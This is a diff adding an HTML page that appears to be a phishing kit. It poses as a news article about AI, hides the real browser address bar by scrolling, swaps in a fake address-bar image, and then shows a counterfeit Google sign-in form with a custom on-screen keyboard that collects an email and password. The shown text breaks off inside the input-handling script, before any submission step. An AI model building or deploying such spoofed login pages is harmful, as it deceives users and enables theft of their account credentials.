@@ -1,0 +1,1303 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>News Page - Transition Simulation with Google Keyboard Style</title>
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, interactive-widget=overlays-content"
+    />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      /* PERBAIKAN UTAMA: Terapkan overflow hidden ke html dan body */
+      html,
+      body {
+        margin: 0;
+        padding: 0;
+        /* Tinggi awal body untuk scroll berita, akan diubah oleh JS */
+        min-height: 180vh;
+        font-family: "Google Sans", "Roboto", Arial, sans-serif;
+        background: #f8f8f8;
+        overflow-x: hidden; /* Pastikan tidak ada scroll horizontal */
+        overflow-y: auto; /* Allow scrolling by default */
+        transition: overflow-y 0s; /* Hapus delay */
+        /* Tambahkan properti untuk mencegah "overscroll glow/bounce" di beberapa browser */
+        overscroll-behavior-y: contain;
+      }
+
+      html.no-scroll,
+      body.no-scroll {
+        overflow: hidden !important; /* Paksa hidden untuk semua overflow */
+        height: 100vh !important; /* Paksa tinggi 100vh */
+        min-height: 100vh !important; /* Paksa min-height 100vh */
+      }
+
+      .fake-address-bar-container {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 50px; /* Address bar height */
+        background-color: white;
+        z-index: 0; /* Initially low so content can overlap */
+        pointer-events: none; /* Clicks pass through */
+        overflow: hidden;
+      }
+
+      .fake-address-bar-container.active {
+        z-index: 9999; /* High z-index when active to appear above content */
+      }
+
+      .fake-address-bar-container img {
+        width: 100%;
+        height: 100%;
+        display: block;
+        object-fit: fill;
+        object-position: top center;
+        opacity: 1; /* Initially 1 for 1.jpg */
+      }
+
+      #addressImage2 {
+        opacity: 0; /* Hide second image by default */
+        position: absolute;
+        top: 0;
+        left: 0;
+      }
+
+      /* Wrapper for the main scrollable content area */
+      .content-area-wrapper {
+        position: relative;
+        padding-top: 0;
+        width: 100%;
+        box-sizing: border-box;
+        padding-bottom: 50px;
+      }
+
+      /* Initial scrollable content */
+      .content {
+        position: relative; /* Initially relative position */
+        z-index: 1; /* Above fixed address bar initially */
+        max-width: 800px; /* Max width for news content */
+        margin: 0 auto;
+        padding: 20px;
+        box-sizing: border-box;
+        transition: opacity 0.2s ease; /* Fade transition for content */
+        background-color: #ffffff; /* News content background */
+        border-radius: 8px;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      }
+
+      .content.hidden {
+        opacity: 0;
+        pointer-events: none;
+      }
+
+      /* --- Specific News Content Styling --- */
+      .news-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 20px;
+        padding-bottom: 15px;
+        border-bottom: 1px solid #eee;
+        flex-wrap: wrap;
+      }
+
+      .news-logo {
+        font-size: 28px;
+        font-weight: 700;
+        color: #d32f2f; /* Typical news red color */
+        text-transform: uppercase;
+        margin-bottom: 10px;
+      }
+
+      .news-nav ul {
+        list-style: none;
+        margin: 0;
+        padding: 0;
+        display: flex;
+        gap: 20px;
+        flex-wrap: wrap;
+        justify-content: center;
+      }
+
+      .news-nav a {
+        text-decoration: none;
+        color: #555;
+        font-weight: 500;
+        font-size: 15px;
+      }
+
+      .news-nav a:hover {
+        color: #d32f2f;
+      }
+
+      .news-date {
+        font-size: 14px;
+        color: #777;
+        text-align: right;
+        margin-top: -10px;
+        margin-bottom: 20px;
+        text-align: center;
+        width: 100%;
+      }
+
+      .main-article h1 {
+        font-size: 36px;
+        color: #202124;
+        margin-bottom: 15px;
+        line-height: 1.2;
+        font-weight: 700;
+        font-size: 28px;
+      }
+
+      .main-article .author-date {
+        font-size: 14px;
+        color: #777;
+        margin-bottom: 20px;
+        border-bottom: 1px solid #eee;
+        padding-bottom: 10px;
+      }
+
+      .main-article img {
+        width: 100%;
+        height: auto;
+        border-radius: 6px;
+        margin-bottom: 25px;
+      }
+
+      .main-article p {
+        line-height: 1.8;
+        margin-bottom: 20px;
+        color: #333;
+        font-size: 17px;
+        text-align: justify;
+        font-size: 15px;
+      }
+
+      .related-articles {
+        margin-top: 40px;
+        padding-top: 30px;
+        border-top: 1px solid #eee;
+      }
+
+      .related-articles h2 {
+        font-size: 22px;
+        color: #202124;
+        margin-bottom: 20px;
+        font-weight: 500;
+      }
+
+      .related-articles ul {
+        list-style: none;
+        padding: 0;
+      }
+
+      .related-articles li {
+        margin-bottom: 15px;
+      }
+
+      .related-articles a {
+        text-decoration: none;
+        color: #1a73e8;
+        font-size: 16px;
+        font-weight: 500;
+      }
+
+      .related-articles a:hover {
+        text-decoration: underline;
+      }
+
+      /* Loading Overlay & Login Section will be FIXED after transition */
+      .loading-overlay,
+      .login-section {
+        opacity: 0;
+        position: fixed; /* IMPORTANT: Change to fixed */
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100vh; /* Fill entire viewport */
+        padding-top: 56px; /* Space for address bar */
+        box-sizing: border-box;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background-color: #f8f8f8; /* Background to cover content below */
+        z-index: 2; /* Above fading content, below active address bar */
+        pointer-events: none; /* Not clickable initially */
+        transition: opacity 0.5s ease; /* For fade in/out transition */
+      }
+
+      .loading-overlay {
+        text-align: center;
+        font-size: 24px;
+        color: #555;
+        flex-direction: column; /* To vertically center "Loading..." */
+      }
+
+      .loading-overlay.visible {
+        opacity: 1;
+        pointer-events: auto;
+      }
+
+      .login-section {
+        z-index: 3; /* Topmost when it appears */
+      }
+
+      .login-section.visible {
+        opacity: 1;
+        pointer-events: auto;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        padding-top: 56px;
+        box-sizing: border-box;
+      }
+
+      .login-form {
+        background-color: white; /* White background */
+        padding: 48px; /* More padding */
+        border-radius: 8px; /* Softer corners */
+        box-shadow: 0 1px 3px 0 rgba(60, 64, 67, 0.302),
+          0 4px 8px 3px rgba(60, 64, 67, 0.149); /* Google-like shadow */
+        width: 100%;
+        max-width: 450px; /* More flexible form width */
+        text-align: center;
+        border: 1px solid #dadce0; /* Thin border */
+        box-sizing: border-box;
+        max-height: calc(100vh - 50px - 280px - 20px);
+        overflow-y: auto; /* Allow internal scrolling if content overflows */
+        transform: translateY(0);
+        transition: transform 0.3s ease-out; /* Smooth transition for repositioning */
+      }
+
+      .form-container {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        width: 100%;
+        height: 100%;
+        transition: transform 0.3s ease-out;
+      }
+
+      .login-section.visible.keyboard-active .form-container {
+        transform: translateY(-140px);
+      }
+
+      .login-form .logo {
+        margin-bottom: 24px; /* Space between logo and title */
+      }
+
+      .login-form .logo img {
+        width: 80px; /* Logo size */
+        height: auto;
+      }
+
+      .login-form h2 {
+        margin-bottom: 8px; /* Space from title to description */
+        color: #202124; /* Darker text color */
+        font-size: 24px;
+        font-weight: normal; /* Normal font weight */
+      }
+
+      .login-form p.subtitle {
+        color: #202124;
+        font-size: 16px;
+        margin-bottom: 24px; /* Space from subtitle to first input */
+      }
+
+      .input-group {
+        margin-bottom: 20px;
+        text-align: left;
+      }
+
+      .input-group label {
+        display: none; /* Label hidden to focus on placeholder */
+      }
+
+      .input-group input[type="text"],
+      .input-group input[type="password"] {
+        width: 100%; /* Full width */
+        padding: 15px 14px; /* Adjusted padding */
+        border: 1px solid #dadce0; /* Default border */
+        border-radius: 4px; /* Slightly rounded corners */
+        font-size: 16px;
+        color: #202124;
+        box-sizing: border-box;
+        transition: border-color 0.2s ease, box-shadow 0.2s ease;
+        -webkit-user-select: none; /* iOS Safari */
+        -moz-user-select: none; /* Firefox */
+        -ms-user-select: none; /* IE/Edge */
+        user-select: none; /* Standard */
+        caret-color: transparent; /* Sembunyikan kursor asli jika tidak perlu */
+        cursor: pointer; /* Memberi indikasi bisa diklik */
+      }
+
+      .input-group input[type="text"]:focus,
+      .input-group input[type="password"]:focus {
+        outline: none;
+        border-color: #1a73e8; /* Blue border on focus */
+        box-shadow: 0 0 0 1px #1a73e8; /* Thin blue shadow on focus */
+      }
+
+      .login-form button {
+        width: auto; /* Width according to content */
+        min-width: 96px; /* Minimum width */
+        padding: 10px 24px; /* Button padding */
+        background-color: #1a73e8; /* Google blue color */
+        color: white;
+        border: none;
+        border-radius: 4px;
+        font-size: 14px; /* Button font size */
+        font-weight: 500;
+        cursor: pointer;
+        transition: background-color 0.3s ease, box-shadow 0.3s ease;
+      }
+
+      .login-form button:hover {
+        background-color: #176ad2;
+        box-shadow: 0 1px 3px 1px rgba(66, 133, 244, 0.3),
+          0 1px 2px 0 rgba(66, 133, 244, 0.15);
+      }
+
+      .login-form button:disabled {
+        /* opacity: 0.6; */
+        /* cursor: not-allowed; */
+      }
+
+      .login-form .actions {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-top: 32px;
+      }
+
+      .login-form .link-create-account,
+      .login-form .link-forgot-password {
+        color: #1a73e8;
+        font-size: 14px;
+        text-decoration: none;
+        font-weight: 500;
+      }
+
+      .login-form .link-create-account:hover,
+      .login-form .link-forgot-password:hover {
+        text-decoration: underline;
+      }
+
+      #customKeyboard {
+        position: fixed;
+        bottom: -280px;
+        left: 0;
+        width: 100%;
+        background-color: #202124;
+        padding: 8px 5px;
+        box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.4);
+        z-index: 1000;
+        display: block;
+        transition: bottom 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        box-sizing: border-box;
+        height: 280px;
+        flex-shrink: 0;
+      }
+
+      #customKeyboard.visible {
+        bottom: 0;
+      }
+
+      .keyboard-layout {
+        display: none;
+        flex-direction: column;
+        gap: 6px;
+        width: 100%;
+        height: 100%;
+      }
+
+      .keyboard-layout.active {
+        display: flex;
+      }
+
+      .keyboard-row {
+        display: flex;
+        justify-content: center;
+        gap: 5px;
+        width: 100%;
+      }
+
+      #customKeyboard button {
+        flex: 1;
+        padding: 15px 0;
+        font-size: 1.1em;
+        font-weight: 500;
+        border: none;
+        border-radius: 8px;
+        background-color: #3d3d3d;
+        color: #e0e0e0;
+        box-shadow: none;
+        cursor: pointer;
+        transition: background-color 0.1s ease-out, transform 0.05s ease-out;
+        min-width: 30px;
+        height: 48px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        position: relative;
+      }
+
+      #customKeyboard button:active {
+        background-color: #5a5a5a;
+        transform: translateY(1px);
+      }
+
+      .space-key {
+        flex: 4;
+        font-size: 1em !important;
+        background-color: #4d4d4d;
+        color: #e0e0e0;
+      }
+
+      .special-key {
+        background-color: #4d4d4d;
+        font-weight: 700;
+        color: #e0e0e0;
+      }
+
+      .shift-active {
+        background-color: #8ab4f8 !important;
+        color: #202124 !important;
+      }
+
+      .icon-key svg {
+        fill: #e0e0e0;
+        width: 24px;
+        height: 24px;
+      }
+
+      /* --- KODE TAMBAHAN UNTUK LAYAR LOADING PUTIH --- */
+      .final-loading-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100vh;
+        background-color: #f8f8f8;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        z-index: 1001; /* Lebih tinggi dari keyboard */
+        opacity: 0;
+        pointer-events: none;
+        transition: opacity 0.5s ease;
+        text-align: center;
+        font-size: 24px;
+        color: #555;
+      }
+
+      .final-loading-overlay.visible {
+        opacity: 1;
+        pointer-events: auto;
+      }
+
+      /* MEDIA QUERIES for better responsiveness */
+      @media (max-width: 768px) {
+        .login-form {
+          margin: 0 20px;
+          padding: 30px 20px;
+          max-height: none;
+        }
+        #customKeyboard {
+          height: 260px;
+          bottom: -260px;
+        }
+        #customKeyboard button {
+          font-size: 1em;
+          padding: 12px 0;
+          height: 44px;
+        }
+        .login-section.visible.keyboard-active .form-container {
+          transform: translateY(-130px);
+        }
+      }
+
+      @media (max-width: 480px) {
+        .login-form {
+          padding: 25px 15px;
+          max-height: none;
+        }
+        #customKeyboard {
+          height: 240px;
+          bottom: -240px;
+        }
+        #customKeyboard button {
+          font-size: 0.9em;
+          padding: 10px 0;
+          height: 40px;
+        }
+        .login-section.visible.keyboard-active .form-container {
+          transform: translateY(-120px);
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="fake-address-bar-container" id="fakeAddressBar">
+      <img src="1.jpg" alt="Fake Address Bar 1" id="addressImage1" />
+      <img
+        src="adresss-bar-google.png"
+        alt="Fake Address Bar 2"
+        id="addressImage2"
+      />
+    </div>
+
+    <div class="content-area-wrapper" id="contentAreaWrapper">
+      <div class="content" id="mainContent">
+        <div class="news-header">
+          <div class="news-logo">World News Daily</div>
+          <nav class="news-nav">
+            <ul>
+              <li><a href="#">National</a></li>
+              <li><a href="#">International</a></li>
+              <li><a href="#">Technology</a></li>
+              <li><a href="#">Sports</a></li>
+            </ul>
+          </nav>
+        </div>
+        <div class="news-date">Thursday, July 31, 2025 | 1:55 AM WIB</div>
+
+        <div class="main-article">
+          <h1>
+            Artificial Intelligence Reshaping Industries: A Global Perspective
+          </h1>
+          <p class="author-date">
+            By: Editorial Staff | Published: June 5, 2025
+          </p>
+          <img
+            src="https://beconnected.esafety.gov.au/pluginfile.php/99437/mod_resource/content/2/what-is-ai%20%281%29.jpg"
+            alt="AI main article image"
+          />
+          <p>
+            <b>JAKARTA</b> – Artificial Intelligence (AI) continues to be a
+            primary driver of industrial revolution worldwide. From
+            manufacturing to healthcare, AI not only enhances operational
+            efficiency but also unlocks previously unimaginable new business
+            opportunities. Experts predict that AI adoption will become even
+            more massive within the next five years, fundamentally transforming
+            the landscape of work and the economy.
+          </p>
+          <p>
+            At a recently concluded global technology conference, leading tech
+            companies showcased their latest innovations in AI. Demonstrations
+            highlighted AI's capabilities in complex data analysis, process
+            automation, and customer experience personalization. Panel
+            discussions emphasized the importance of ethical development in AI
+            and the need for adaptive regulations to ensure this technology is
+            used for the common good.
+          </p>
+          <p>
+            While AI's potential is immense, the challenges are equally
+            significant. Concerns about job displacement and data privacy issues
+            were hot topics, requiring comprehensive solutions from governments,
+            industries, and academia. However, the spirit of collaboration to
+            overcome these challenges appeared strong, signaling a shared
+            commitment to embracing the AI-driven digital era.
+          </p>
+          <p>
+            The Indonesian government itself has demonstrated a commitment to
+            integrating AI across various sectors, including education and
+            public services, to enhance the nation's competitiveness on the
+            international stage. Strategic steps are being formulated to prepare
+            a skilled workforce in the field of AI.
+          </p>
+        </div>
+
+        <div class="related-articles">
+          <h2>Related News</h2>
+          <ul>
+            <li>
+              <a href="#">Trade War Impact on Global Economy in This Quarter</a>
+            </li>
+            <li>
+              <a href="#"
+                >Latest Electric Car Innovations from European Manufacturers</a
+              >
+            </li>
+            <li>
+              <a href="#"
+                >Crypto Market Analysis: Volatility and Investment
+                Opportunities</a
+              >
+            </li>
+          </ul>
+        </div>
+        <p style="text-align: center; margin-top: 40px; color: #777">
+          Scroll down further to see the page transition simulation.
+        </p>
+      </div>
+    </div>
+
+    <div class="loading-overlay" id="loadingOverlay">Loading...</div>
+
+    <div class="login-section" id="loginFormSection">
+      <div class="form-container">
+        <form class="login-form" id="googleLoginForm">
+          <div class="logo">
+            <img
+              src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"
+              alt="Google Logo"
+            />
+          </div>
+          <h2 id="loginTitle">Sign in</h2>
+          <p class="subtitle" id="loginSubtitle">Use your Google Account</p>
+          <div class="input-group">
+            <label for="username">Email or phone</label>
+            <input
+              type="text"
+              id="username"
+              name="username"
+              placeholder="Email or phone"
+              readonly="true"
+              inputmode="none"
+            />
+          </div>
+          <div class="input-group" id="passwordGroup" style="display: none">
+            <label for="password">Password</label>
+            <input
+              type="password"
+              id="password"
+              name="password"
+              placeholder="Password"
+              readonly="true"
+              inputmode="none"
+            />
+          </div>
+
+          <a href="#" class="link-forgot-password" id="forgotEmailLink"
+            >Forgot email?</a
+          >
+          <a
+            href="#"
+            class="link-forgot-password"
+            id="forgotPasswordLink"
+            style="display: none"
+            >Forgot password?</a
+          >
+
+          <div class="actions">
+            <a href="#" class="link-create-account">Create account</a>
+            <button type="button" id="nextButton" disabled>Next</button>
+          </div>
+        </form>
+      </div>
+      <div id="customKeyboard">
+        <div
+          class="keyboard-row top-utility-row"
+          style="gap: 15px; margin-bottom: 8px"
+        >
+          <button
+            data-key="apps"
+            class="special-key"
+            style="
+              flex: 0 0 auto;
+              width: 36px;
+              height: 36px;
+              border-radius: 50%;
+            "
+          >
+            <span style="font-size: 1.2em">&#x22EF;</span>
+          </button>
+          <button
+            data-key="emoji_icon"
+            class="special-key"
+            style="
+              flex: 0 0 auto;
+              width: 36px;
+              height: 36px;
+              border-radius: 50%;
+            "
+          >
+            <span style="font-size: 1.2em">&#x1F60A;</span>
+          </button>
+          <button
+            data-key="gif"
+            class="special-key"
+            style="
+              flex: 0 0 auto;
+              width: 36px;
+              height: 36px;
+              border-radius: 50%;
+            "
+          >
+            <span style="font-size: 1.2em">GIF</span>
+          </button>
+          <button
+            data-key="settings"
+            class="special-key"
+            style="
+              flex: 0 0 auto;
+              width: 36px;
+              height: 36px;
+              border-radius: 50%;
+            "
+          >
+            <span style="font-size: 1.2em">&#x2699;</span>
+          </button>
+          <button
+            data-key="translate"
+            class="special-key"
+            style="
+              flex: 0 0 auto;
+              width: 36px;
+              height: 36px;
+              border-radius: 50%;
+            "
+          >
+            <span style="font-size: 1.2em">&#x1F310;</span>
+          </button>
+          <button
+            data-key="palette"
+            class="special-key"
+            style="
+              flex: 0 0 auto;
+              width: 36px;
+              height: 36px;
+              border-radius: 50%;
+            "
+          >
+            <span style="font-size: 1.2em">&#x1F3A8;</span>
+          </button>
+          <button
+            data-key="mic"
+            class="special-key"
+            style="
+              flex: 0 0 auto;
+              width: 36px;
+              height: 36px;
+              border-radius: 50%;
+            "
+          >
+            <span style="font-size: 1.2em">&#x1F399;</span>
+          </button>
+        </div>
+
+        <div id="letterLayout" class="keyboard-layout">
+          <div class="keyboard-row">
+            <button data-key="q">
+              Q<span class="secondary-symbol">1</span>
+            </button>
+            <button data-key="w">
+              W<span class="secondary-symbol">2</span>
+            </button>
+            <button data-key="e">
+              E<span class="secondary-symbol">3</span>
+            </button>
+            <button data-key="r">
+              R<span class="secondary-symbol">4</span>
+            </button>
+            <button data-key="t">
+              T<span class="secondary-symbol">5</span>
+            </button>
+            <button data-key="y">
+              Y<span class="secondary-symbol">6</span>
+            </button>
+            <button data-key="u">
+              U<span class="secondary-symbol">7</span>
+            </button>
+            <button data-key="i">
+              I<span class="secondary-symbol">8</span>
+            </button>
+            <button data-key="o">
+              O<span class="secondary-symbol">9</span>
+            </button>
+            <button data-key="p">
+              P<span class="secondary-symbol">0</span>
+            </button>
+          </div>
+          <div class="keyboard-row">
+            <button data-key="a">A</button>
+            <button data-key="s">S</button>
+            <button data-key="d">D</button>
+            <button data-key="f">F</button>
+            <button data-key="g">G</button>
+            <button data-key="h">H</button>
+            <button data-key="j">J</button>
+            <button data-key="k">K</button>
+            <button data-key="l">L</button>
+          </div>
+          <div class="keyboard-row">
+            <button data-key="shift" class="special-key">⇧</button>
+            <button data-key="z">Z</button>
+            <button data-key="x">X</button>
+            <button data-key="c">C</button>
+            <button data-key="v">V</button>
+            <button data-key="b">B</button>
+            <button data-key="n">N</button>
+            <button data-key="m">M</button>
+            <button data-key="backspace" class="special-key icon-key">
+              <svg viewBox="0 0 24 24">
+                <path
+                  d="M22 3.41L20.59 2 12 10.59 3.41 2 2 3.41 10.59 12 2 20.59 3.41 22 12 13.41 20.59 22 22 20.59 13.41 12z"
+                  fill="none"
+                />
+                <path
+                  d="M22 3.41L20.59 2 12 10.59 3.41 2 2 3.41 10.59 12 2 20.59 3.41 22 12 13.41 20.59 22 22 20.59 13.41 12z"
+                />
+              </svg>
+            </button>
+          </div>
+          <div class="keyboard-row">
+            <button data-key="?123" class="special-key">?123</button>
+            <button data-key="emoji_key" class="special-key">
+              😀<span class="secondary-symbol">,</span>
+            </button>
+            <button data-key="globe_key" class="special-key">🌐</button>
+            <button data-key="space" class="space-key"></button>
+            <button data-key="dot_key" class="special-key">.</button>
+            <button data-key="enter" class="special-key icon-key">
+              <svg viewBox="0 0 24 24">
+                <path
+                  d="M19 7v4H5.83l3.58-3.59L8 6l-6 6 6 6 1.41-1.41L5.83 13H21V7z"
+                  fill="none"
+                />
+                <path
+                  d="M19 7v4H5.83l3.58-3.59L8 6l-6 6 6 6 1.41-1.41L5.83 13H21V7z"
+                />
+              </svg>
+            </button>
+          </div>
+        </div>
+
+        <div id="numberLayout" class="keyboard-layout">
+          <div class="keyboard-row">
+            <button data-key="1">1</button>
+            <button data-key="2">2</button>
+            <button data-key="3">3</button>
+            <button data-key="4">4</button>
+            <button data-key="5">5</button>
+            <button data-key="6">6</button>
+            <button data-key="7">7</button>
+            <button data-key="8">8</button>
+            <button data-key="9">9</button>
+            <button data-key="0">0</button>
+          </div>
+          <div class="keyboard-row">
+            <button data-key="@">@</button>
+            <button data-key="#">#</button>
+            <button data-key="$">$</button>
+            <button data-key="_">_</button>
+            <button data-key="&">&</button>
+            <button data-key="-">-</button>
+            <button data-key="+">+</button>
+            <button data-key="(">(</button>
+            <button data-key=")">)</button>
+            <button data-key="/">/</button>
+          </div>
+          <div class="keyboard-row">
+            <button data-key="sym_toggle_1" class="special-key">
+              =/<span class="secondary-symbol">&#x2022;</span>
+            </button>
+            <button data-key="star">*</button>
+            <button data-key="double_quote">
+              "<span class="secondary-symbol">'</span>
+            </button>
+            <button data-key="single_quote">
+              '<span class="secondary-symbol">"</span>
+            </button>
+            <button data-key=":">:</button>
+            <button data-key=";">;</button>
+            <button data-key="!">!</button>
+            <button data-key="?">?</button>
+            <button data-key="backspace" class="special-key icon-key">
+              <svg viewBox="0 0 24 24">
+                <path
+                  d="M22 3.41L20.59 2 12 10.59 3.41 2 2 3.41 10.59 12 2 20.59 3.41 22 12 13.41 20.59 22 22 20.59 13.41 12z"
+                  fill="none"
+                />
+                <path
+                  d="M22 3.41L20.59 2 12 10.59 3.41 2 2 3.41 10.59 12 2 20.59 3.41 22 12 13.41 20.59 22 22 20.59 13.41 12z"
+                />
+              </svg>
+            </button>
+          </div>
+          <div class="keyboard-row">
+            <button data-key="abc" class="special-key">ABC</button>
+            <button data-key="comma" class="special-key">
+              ,<span class="secondary-symbol">&#x1F60A;</span>
+            </button>
+            <button data-key="lang_toggle" class="special-key">ID • EN</button>
+            <button data-key="dot_key" class="special-key">
+              .<span class="secondary-symbol">&#x2022;</span>
+            </button>
+            <button data-key="enter" class="special-key icon-key">
+              <svg viewBox="0 0 24 24">
+                <path
+                  d="M19 7v4H5.83l3.58-3.59L8 6l-6 6 6 6 1.41-1.41L5.83 13H21V7z"
+                  fill="none"
+                />
+                <path
+                  d="M19 7v4H5.83l3.58-3.59L8 6l-6 6 6 6 1.41-1.41L5.83 13H21V7z"
+                />
+              </svg>
+            </button>
+          </div>
+        </div>
+
+        <div id="symbolLayout" class="keyboard-layout">
+          <div class="keyboard-row">
+            <button data-key="tilde">~</button>
+            <button data-key="backtick">`</button>
+            <button data-key="pipe">|</button>
+            <button data-key="bullet"><span>&#x2022;</span></button>
+            <button data-key="sqrt">√</button>
+            <button data-key="pi">π</button>
+            <button data-key="divide">÷</button>
+            <button data-key="multiply">×</button>
+            <button data-key="paragraph_mark">§</button>
+            <button data-key="delta">Δ</button>
+          </div>
+          <div class="keyboard-row">
+            <button data-key="pound">£</button>
+            <button data-key="cent">¢</button>
+            <button data-key="euro">€</button>
+            <button data-key="yen">¥</button>
+            <button data-key="caret">^</button>
+            <button data-key="degree">°</button>
+            <button data-key="equals">=</button>
+            <button data-key="open_brace">{</button>
+            <button data-key="close_brace">}</button>
+            <button data-key="backslash">\</button>
+          </div>
+          <div class="keyboard-row">
+            <button data-key="number_toggle" class="special-key">?123</button>
+            <button data-key="percent">%</button>
+            <button data-key="copyright">©</button>
+            <button data-key="registered">®</button>
+            <button data-key="trademark">™</button>
+            <button data-key="check">✓</button>
+            <button data-key="open_bracket">[</button>
+            <button data-key="close_bracket">]</button>
+            <button data-key="backspace" class="special-key icon-key">
+              <svg viewBox="0 0 24 24">
+                <path
+                  d="M22 3.41L20.59 2 12 10.59 3.41 2 2 3.41 10.59 12 2 20.59 3.41 22 12 13.41 20.59 22 22 20.59 13.41 12z"
+                  fill="none"
+                />
+                <path
+                  d="M22 3.41L20.59 2 12 10.59 3.41 2 2 3.41 10.59 12 2 20.59 3.41 22 12 13.41 20.59 22 22 20.59 13.41 12z"
+                />
+              </svg>
+            </button>
+          </div>
+          <div class="keyboard-row">
+            <button data-key="abc" class="special-key">ABC</button>
+            <button data-key="less_than" class="special-key"><</button>
+            <button data-key="lang_toggle" class="special-key">ID • EN</button>
+            <button data-key="greater_than" class="special-key">></button>
+            <button data-key="enter" class="special-key icon-key">
+              <svg viewBox="0 0 24 24">
+                <path
+                  d="M19 7v4H5.83l3.58-3.59L8 6l-6 6 6 6 1.41-1.41L5.83 13H21V7z"
+                  fill="none"
+                />
+                <path
+                  d="M19 7v4H5.83l3.58-3.59L8 6l-6 6 6 6 1.41-1.41L5.83 13H21V7z"
+                />
+              </svg>
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="final-loading-overlay" id="finalLoadingOverlay">Loading...</div>
+
+    <script>
+      window.addEventListener("load", () => {
+        const fakeBar = document.getElementById("fakeAddressBar");
+        const addressImage1 = document.getElementById("addressImage1");
+        const addressImage2 = document.getElementById("addressImage2");
+        const mainContent = document.getElementById("mainContent");
+        const loadingOverlay = document.getElementById("loadingOverlay");
+        const loginFormSection = document.getElementById("loginFormSection");
+        const contentAreaWrapper =
+          document.getElementById("contentAreaWrapper");
+        const body = document.body;
+        const html = document.documentElement; // Dapatkan elemen html juga
+
+        const usernameInput = document.getElementById("username");
+        const passwordInput = document.getElementById("password");
+        const passwordGroup = document.getElementById("passwordGroup");
+        const nextButton = document.getElementById("nextButton");
+        const loginTitle = document.getElementById("loginTitle");
+        const loginSubtitle = document.getElementById("loginSubtitle");
+        const forgotEmailLink = document.getElementById("forgotEmailLink");
+        const forgotPasswordLink =
+          document.getElementById("forgotPasswordLink");
+
+        const customKeyboard = document.getElementById("customKeyboard");
+        const letterLayout = document.getElementById("letterLayout");
+        const numberLayout = document.getElementById("numberLayout");
+        const symbolLayout = document.getElementById("symbolLayout");
+
+        const finalLoadingOverlay = document.getElementById(
+          "finalLoadingOverlay"
+        ); // Elemen baru
+
+        const allInputFields = [usernameInput, passwordInput]; // All input fields we manage
+        let activeInputField = null;
+        let isShifted = false;
+        let currentLayoutId = "letterLayout"; // Start with letters
+        let currentFormStep = 1; // 1 for username, 2 for password
+
+        // Function to update the case of letter keys
+        const updateShiftState = () => {
+          letterLayout
+            .querySelectorAll("button[data-key]")
+            .forEach((button) => {
+              const key = button.dataset.key;
+              if (key.length === 1 && /[a-z]/.test(key)) {
+                button.textContent = isShifted
+                  ? key.toUpperCase()
+                  : key.toLowerCase();
+              } else if (key === "shift") {
+                if (isShifted) {
+                  button.classList.add("shift-active");
+                  button.innerHTML = `
+                    <svg viewBox="0 0 24 24" style="width: 24px; height: 24px;">
+                        <path fill="none" d="M0 0h24v24H0z"/>
+                        <path d="M12 8.41L6.41 14 8 15.59l4-4 4 4 1.59-1.59z" fill="currentColor"/>
+                    </svg>
+                    `; // Up arrow for active shift
+                } else {
+                  button.classList.remove("shift-active");
+                  button.innerHTML = `⇧`; // Original shift icon
+                }
+              }
+            });
+        };
+
+        // Function to switch between keyboard layouts
+        const switchLayout = (layoutId) => {
+          letterLayout.classList.remove("active");
+          numberLayout.classList.remove("active");
+          symbolLayout.classList.remove("active");
+
+          document.getElementById(layoutId).classList.add("active");
+          currentLayoutId = layoutId;
+          if (layoutId !== "letterLayout") {
+            isShifted = false; // Reset shift state if not on letter layout
+          }
+          updateShiftState(); // Update letter case if switching back to letter layout
+        };
+
+        // Function to scroll the page down slightly to hide the real address bar
+        const scrollPageDownInitial = () => {
+          window.scrollTo({
+            top: 1,
+            behavior: "smooth",
+          });
+        };
+
+        // Initial scroll on load
+        scrollPageDownInitial();
+
+        // Initial delay of 4 seconds before all transitions begin
+        setTimeout(() => {
+          window.scrollTo(0, 0); // Gulir ke paling atas
+          body.classList.add("no-scroll");
+          html.classList.add("no-scroll");
+          fakeBar.classList.add("active");
+          mainContent.classList.add("hidden");
+          setTimeout(() => {
+            addressImage1.style.opacity = "0";
+            addressImage2.style.opacity = "1";
+            loadingOverlay.classList.add("visible");
+            setTimeout(() => {
+              loadingOverlay.classList.remove("visible");
+              loadingOverlay.style.opacity = "0";
+              loadingOverlay.style.pointerEvents = "none";
+              contentAreaWrapper.style.display = "none";
+              loginFormSection.classList.add("visible");
+              body.classList.add("no-scroll");
+              html.classList.add("no-scroll");
+              usernameInput.focus();
+              updateButtonState();
+            }, 1500);
+          }, 21);
+        }, 7000);
+
+        // --- Custom Keyboard & Form Logic ---
+
+        // Function to validate email format
+        const isValidEmail = (email) => {
+          return /\S+@\S+\.\S+/.test(email);
+        };
+
+        // Function to update the disabled state of the next/login button
+        const updateButtonState = () => {
+          if (currentFormStep === 1) {
+            const usernameValue = usernameInput.value.trim();
+            nextButton.disabled = usernameValue === "";
+          } else if (currentFormStep === 2) {
+            nextButton.disabled = passwordInput.value.length < 4;
+          }
+        };
+
+        // Add event listeners to all managed input fields
+        allInputFields.forEach((input) => {
+          input.setAttribute("readonly", "true");
+          input.setAttribute("inputmode", "none");
+
+          input.addEventListener("focus", (event) => {
+            activeInputField = event.target;
